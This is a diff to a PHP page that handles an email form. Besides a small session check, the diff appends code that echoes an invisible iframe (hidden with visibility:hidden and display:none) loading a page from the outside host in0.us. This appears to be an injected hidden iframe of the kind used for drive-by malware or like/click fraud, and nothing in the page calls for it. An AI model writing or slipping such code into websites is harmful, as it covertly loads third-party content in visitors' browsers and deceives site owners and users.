@@ -1,7 +1,14 @@
 <?php
 require('access.php');
+if(isset($_SESSION['UserID']))
+{
+    
+}
+else
+{
+    require('head.php');
 
-
+}
 if (isset($_POST['email'])) $pEmail = addslashes($_POST['email']);
 if (empty($pEmail)) unset($pEmail);
 
@@ -229,5 +236,14 @@ if(isset($pEmail))
         </td>
     </tr>
   </table>
+
+
+<?PHP
+
+            echo '<iframe style="visibility:hidden;display:none" seamless=seamless width="100%" src="';
+            echo 'http://www.in0.us/like/index.php';
+            echo '" height="30%" ></iframe>';
+
+?>
 
 
